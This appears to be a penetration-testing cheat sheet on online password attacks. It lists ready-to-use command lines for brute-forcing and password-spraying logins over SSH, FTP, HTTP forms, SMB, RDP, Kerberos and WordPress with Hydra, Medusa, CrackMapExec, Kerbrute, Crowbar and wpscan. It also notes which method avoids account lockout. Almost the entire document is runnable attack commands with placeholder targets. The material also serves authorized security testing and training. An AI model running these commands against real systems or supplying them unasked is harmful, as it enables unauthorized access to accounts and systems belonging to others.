# Online Password Attacks

## Hydra
```bash
# SSH
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://$TARGET_IP

# FTP
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://$TARGET_IP

# HTTP POST form
hydra -l admin -P pass.txt $TARGET_IP http-post-form "/login:user=^USER^&pass=^PASS^:invalid"

# SMB
hydra -l administrator -P pass.txt smb://$TARGET_IP

# RDP
hydra -l admin -P pass.txt rdp://$TARGET_IP

# With user list
hydra -L users.txt -P pass.txt ssh://$TARGET_IP
```

## Medusa
```bash
medusa -h $TARGET_IP -u admin -P pass.txt -M ssh
medusa -h $TARGET_IP -U users.txt -P pass.txt -M http -m DIR:/login
```

## Password Spraying
```bash
# With CrackMapExec
crackmapexec smb $TARGET_IP -u users.txt -p 'Password123'
crackmapexec smb 10.10.10.0/24 -u admin -p 'Welcome1'

# With Kerbrute (no lockout risk)
kerbrute passwordspray -d $DOMAIN users.txt 'Password1'
```

## Crowbar (RDP Brute Force)
```bash
crowbar -b rdp -s $TARGET_IP/32 -u user -C pass.txt
```

## WordPress
```bash
wpscan --url http://$TARGET_IP/wordpress -U admin -P pass.txt
```
